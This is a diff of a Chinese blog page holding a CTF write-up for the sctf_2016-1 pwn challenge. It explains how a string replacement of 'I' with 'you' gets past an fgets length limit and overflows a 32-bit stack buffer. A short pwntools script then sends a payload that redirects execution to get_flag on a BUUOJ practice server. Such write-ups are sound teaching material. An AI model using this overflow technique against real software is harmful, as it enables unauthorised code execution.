@@ -19,12 +19,12 @@
   <meta name="author" content="野草">
   <meta name="keywords" content="野草">
   
-    <meta name="description" content="先用checksec检查一下:  发现是32位文件，启用了NX，堆栈不可执行。用32位IDA打开，main函数里就一个vuln函数但是我们在函数列表还发现了get_flag函数。打开vuln函数 发现是看不懂的C++代码。我们搜一下它们是什么意思。 std::string::operator&#x3D;函数 原型：string&amp; operator&#x3D; (const string&amp; str);其">
+    <meta name="description" content="先用checksec检查一下:  发现是32位文件，启用了NX，堆栈不可执行。 用32位IDA打开，main函数里就一个vuln函数但是我们在函数列表还发现了get_flag函数。 打开vuln函数  发现是看不懂的C++代码。我们搜一下它们是什么意思。 ###### std::string::operator&#x3D;函数 原型：string&amp; operator&#x3D; (const st">
 <meta property="og:type" content="website">
 <meta property="og:title" content="sctf_2016-1">
 <meta property="og:url" content="https://ycqaq233.github.io/WriteUp/PWN/sctf_2016-1.html">
 <meta property="og:site_name" content="野草">
-<meta property="og:description" content="先用checksec检查一下:  发现是32位文件，启用了NX，堆栈不可执行。用32位IDA打开，main函数里就一个vuln函数但是我们在函数列表还发现了get_flag函数。打开vuln函数 发现是看不懂的C++代码。我们搜一下它们是什么意思。 std::string::operator&#x3D;函数 原型：string&amp; operator&#x3D; (const string&amp; str);其">
+<meta property="og:description" content="先用checksec检查一下:  发现是32位文件，启用了NX，堆栈不可执行。 用32位IDA打开，main函数里就一个vuln函数但是我们在函数列表还发现了get_flag函数。 打开vuln函数  发现是看不懂的C++代码。我们搜一下它们是什么意思。 ###### std::string::operator&#x3D;函数 原型：string&amp; operator&#x3D; (const st">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/PWN/img/sctf2016-1.png">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/PWN/img/sctf2016-2.png">
@@ -225,18 +225,20 @@
                 
 
 <article class="page-content">
-  <p>先用checksec检查一下:<br>
-<img src="img/sctf2016-1.png" srcset="/img/loading.gif" lazyload alt><br>
-发现是32位文件，启用了NX，堆栈不可执行。用32位IDA打开，main函数里就一个vuln函数但是我们在函数列表还发现了get_flag函数。打开vuln函数<img src="img/sctf2016-2.png" srcset="/img/loading.gif" lazyload alt><br>
-发现是看不懂的C++代码。我们搜一下它们是什么意思。</p>
-<h6><span id="stdstringoperator函数"><code>std::string::operator=</code>函数</span></h6>
-<p>原型：string&amp; operator= (const string&amp; str);其中<br>
-operator=：赋值运算符重载函数。<br>
-str：一个字符串对象，如果与 this 不同，则其值为复制 。</p>
-<h6><span id="stdallocatorltchargtallocator函数"><code>std::allocator&lt;char&gt;::allocator</code>函数</span></h6>
-<p>这个真不知道，搜了一下只知道std::allocator是堆内存管理器。其他都不知道。看不懂，反正就是把I变成you。<br>
-fgets限定了读入字符个数，不能用常规方法造成栈溢出。但s长度为60字节，所以输入20个I会变成20个you，再实现栈溢出。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26911</span>)<br>payload = <span class="hljs-string">b&#x27;I&#x27;</span>*(<span class="hljs-number">20</span>) +<span class="hljs-string">b&#x27;aaaa&#x27;</span>+ p32(<span class="hljs-number">0x8048F0D</span>)<span class="hljs-comment">#记得写4个a覆盖一下</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+  <p>先用checksec检查一下: <img src="img/sctf2016-1.png" srcset="/img/loading.gif" lazyload>
+发现是32位文件，启用了NX，堆栈不可执行。
+用32位IDA打开，main函数里就一个vuln函数但是我们在函数列表还发现了get_flag函数。
+打开vuln函数 <img src="img/sctf2016-2.png" srcset="/img/loading.gif" lazyload>
+发现是看不懂的C++代码。我们搜一下它们是什么意思。 ######
+<code>std::string::operator=</code>函数 原型：string&amp; operator=
+(const string&amp; str);其中 operator=：赋值运算符重载函数。
+str：一个字符串对象，如果与 this 不同，则其值为复制 。 ######
+<code>std::allocator&lt;char&gt;::allocator</code>函数
+这个真不知道，搜了一下只知道std::allocator是堆内存管理器。其他都不知道。
+看不懂，反正就是把I变成you。
+fgets限定了读入字符个数，不能用常规方法造成栈溢出。
+但s长度为60字节，所以输入20个I会变成20个you，再实现栈溢出。
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26911</span>)<br>payload = <span class="hljs-string">b&#x27;I&#x27;</span>*(<span class="hljs-number">20</span>) +<span class="hljs-string">b&#x27;aaaa&#x27;</span>+ p32(<span class="hljs-number">0x8048F0D</span>)<span class="hljs-comment">#记得写4个a覆盖一下</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure></p>
 
 
   
